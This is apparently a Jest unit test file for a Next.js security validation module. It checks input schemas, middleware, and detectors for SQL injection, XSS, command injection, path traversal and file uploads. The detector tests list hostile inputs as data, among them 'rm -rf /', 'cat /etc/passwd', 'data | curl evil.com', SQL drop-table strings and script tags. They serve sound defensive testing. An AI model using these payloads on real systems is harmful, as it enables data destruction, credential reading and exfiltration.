/**
 * Unit Tests: Security Validation
 * Coverage: Input validation, SQL injection, XSS, security patterns
 */

import { describe, it, expect } from '@jest/globals'
import { z } from 'zod'
import type { NextRequest } from 'next/server'
import { commonSchemas, SecurityValidator, createValidationMiddleware } from '../validation'

describe('Common Schemas', () => {
  describe('Email Validation', () => {
    it('should validate correct email format', () => {
      const result = commonSchemas.email.parse('test@example.com')
      expect(result).toBe('test@example.com')
    })

    it('should lowercase and trim email', () => {
      const result = commonSchemas.email.parse('  TEST@EXAMPLE.COM  ')
      expect(result).toBe('test@example.com')
    })

    it('should reject invalid email format', () => {
      expect(() => commonSchemas.email.parse('invalid-email')).toThrow()
      expect(() => commonSchemas.email.parse('test@')).toThrow()
      expect(() => commonSchemas.email.parse('@example.com')).toThrow()
    })
  })

  describe('UUID Validation', () => {
    it('should validate correct UUID', () => {
      const uuid = '550e8400-e29b-41d4-a716-446655440000'
      const result = commonSchemas.uuid.parse(uuid)
      expect(result).toBe(uuid)
    })

    it('should reject invalid UUID', () => {
      expect(() => commonSchemas.uuid.parse('invalid-uuid')).toThrow()
      expect(() => commonSchemas.uuid.parse('123456')).toThrow()
    })
  })

  describe('Password Validation', () => {
    it('should validate strong password', () => {
      const result = commonSchemas.password.parse('SecurePass123')
      expect(result).toBe('SecurePass123')
    })

    it('should reject password without uppercase', () => {
      expect(() => commonSchemas.password.parse('securepass123')).toThrow()
    })

    it('should reject password without lowercase', () => {
      expect(() => commonSchemas.password.parse('SECUREPASS123')).toThrow()
    })

    it('should reject password without number', () => {
      expect(() => commonSchemas.password.parse('SecurePassword')).toThrow()
    })

    it('should reject password too short', () => {
      expect(() => commonSchemas.password.parse('Sec123')).toThrow()
    })
  })

  describe('Amount Validation', () => {
    it('should parse valid currency amounts', () => {
      expect(commonSchemas.amount.parse('10.50')).toBe(10.5)
      expect(commonSchemas.amount.parse('100')).toBe(100)
      expect(commonSchemas.amount.parse('0.99')).toBe(0.99)
    })

    it('should reject invalid amounts', () => {
      expect(() => commonSchemas.amount.parse('10.999')).toThrow() // 3 decimals
      expect(() => commonSchemas.amount.parse('abc')).toThrow()
      expect(() => commonSchemas.amount.parse('-10.50')).toThrow()
    })
  })

  describe('Pagination Validation', () => {
    it('should parse valid page number', () => {
      const result = commonSchemas.page.parse('5')
      expect(result).toBe(5)
    })

    it('should default to 1 for invalid page', () => {
      const result = commonSchemas.page.parse('0')
      expect(result).toBe(1)
    })

    it('should limit page to max 1000', () => {
      const result = commonSchemas.page.parse('1001')
      expect(result).toBe(1000)
    })
  })
})

describe('SecurityValidator', () => {
  describe('SQL Injection Detection', () => {
    it('should detect SQL injection patterns', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        '1 UNION SELECT * FROM users',
        "'; DELETE FROM users WHERE 1=1; --",
      ]

      for (const input of maliciousInputs) {
        const result = await SecurityValidator.validateSqlInjection(input)
        expect(result).toBe(false)
      }
    })

    it('should allow safe inputs', async () => {
      const safeInputs = ['John Doe', 'user@example.com', 'Regular text input', '123456']

      for (const input of safeInputs) {
        const result = await SecurityValidator.validateSqlInjection(input)
        expect(result).toBe(true)
      }
    })
  })

  describe('XSS Detection', () => {
    it('should detect XSS patterns', async () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="evil.com"></iframe>',
        '<object data="evil.swf"></object>',
      ]

      for (const input of maliciousInputs) {
        const result = await SecurityValidator.validateXss(input)
        expect(result).toBe(false)
      }
    })

    it('should allow safe HTML-like text', async () => {
      const safeInputs = [
        'Price: $100 < $200',
        'Use <angle brackets> carefully',
        'Email: test@example.com',
      ]

      for (const input of safeInputs) {
        const result = await SecurityValidator.validateXss(input)
        expect(result).toBe(true)
      }
    })
  })

  describe('Command Injection Detection', () => {
    it('should detect command injection patterns', async () => {
      const maliciousInputs = [
        'test; rm -rf /',
        'file && cat /etc/passwd',
        'data | curl evil.com',
        'input $(malicious)',
        'test`whoami`',
      ]

      for (const input of maliciousInputs) {
        const result = await SecurityValidator.validateCommandInjection(input)
        expect(result).toBe(false)
      }
    })

    it('should allow safe inputs', async () => {
      const safeInputs = ['filename.txt', 'user-data', 'test@example.com']

      for (const input of safeInputs) {
        const result = await SecurityValidator.validateCommandInjection(input)
        expect(result).toBe(true)
      }
    })
  })

  describe('Path Traversal Detection', () => {
    it('should detect path traversal patterns', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '%2e%2e/etc/passwd',
        'folder/../../secret',
      ]

      for (const input of maliciousInputs) {
        const result = await SecurityValidator.validatePathTraversal(input)
        expect(result).toBe(false)
      }
    })

    it('should allow safe paths', async () => {
      const safeInputs = ['folder/file.txt', 'documents/report.pdf', 'images/photo.jpg']

      for (const input of safeInputs) {
        const result = await SecurityValidator.validatePathTraversal(input)
        expect(result).toBe(true)
      }
    })
  })

  describe('File Upload Validation', () => {
    it('should validate allowed file types', async () => {
      const validFiles = [
        { name: 'photo.jpg', mime: 'image/jpeg', size: 1024 * 1024 },
        { name: 'document.pdf', mime: 'application/pdf', size: 2 * 1024 * 1024 },
        { name: 'text.txt', mime: 'text/plain', size: 500 * 1024 },
      ]

      for (const file of validFiles) {
        const result = await SecurityValidator.validateFileUpload(file.name, file.mime, file.size)
        expect(result).toBe(true)
      }
    })

    it('should reject disallowed file types', async () => {
      const invalidFiles = [
        { name: 'malware.exe', mime: 'application/x-msdownload', size: 1024 },
        { name: 'script.js', mime: 'application/javascript', size: 1024 },
        { name: 'data.xml', mime: 'application/xml', size: 1024 },
      ]

      for (const file of invalidFiles) {
        const result = await SecurityValidator.validateFileUpload(file.name, file.mime, file.size)
        expect(result).toBe(false)
      }
    })

    it('should reject files exceeding size limit', async () => {
      const result = await SecurityValidator.validateFileUpload(
        'large.jpg',
        'image/jpeg',
        15 * 1024 * 1024 // 15MB > 10MB limit
      )
      expect(result).toBe(false)
    })
  })
})

describe('Validation Middleware', () => {
  describe('Body Validation', () => {
    it('should validate request body', async () => {
      const middleware = createValidationMiddleware({
        body: z.object({
          name: z.string(),
          age: z.number(),
        }),
      })

      // Mock request
      const mockRequest = {
        method: 'POST',
        json: async () => ({ name: 'John', age: 30 }),
        headers: new Map(),
        nextUrl: { searchParams: new URLSearchParams() },
      } as unknown as NextRequest

      const result = await middleware(mockRequest)
      expect(result.success).toBe(true)
      if (result.success) {
        expect(result.data.body).toEqual({ name: 'John', age: 30 })
      }
    })

    it('should reject invalid body', async () => {
      const middleware = createValidationMiddleware({
        body: z.object({
          email: commonSchemas.email,
        }),
      })

      const mockRequest = {
        method: 'POST',
        json: async () => ({ email: 'invalid-email' }),
        headers: new Map(),
        nextUrl: { searchParams: new URLSearchParams() },
      } as unknown as NextRequest

      const result = await middleware(mockRequest)
      expect(result.success).toBe(false)
    })
  })

  describe('Query Validation', () => {
    it('should validate query parameters', async () => {
      const middleware = createValidationMiddleware({
        query: z.object({
          page: commonSchemas.page,
          limit: commonSchemas.limit,
        }),
      })

      const searchParams = new URLSearchParams('page=2&limit=50')
      const mockRequest = {
        method: 'GET',
        headers: new Map(),
        nextUrl: { searchParams },
      } as unknown as NextRequest

      const result = await middleware(mockRequest)
      expect(result.success).toBe(true)
      if (result.success) {
        expect(result.data.query).toEqual({ page: 2, limit: 50 })
      }
    })
  })
})
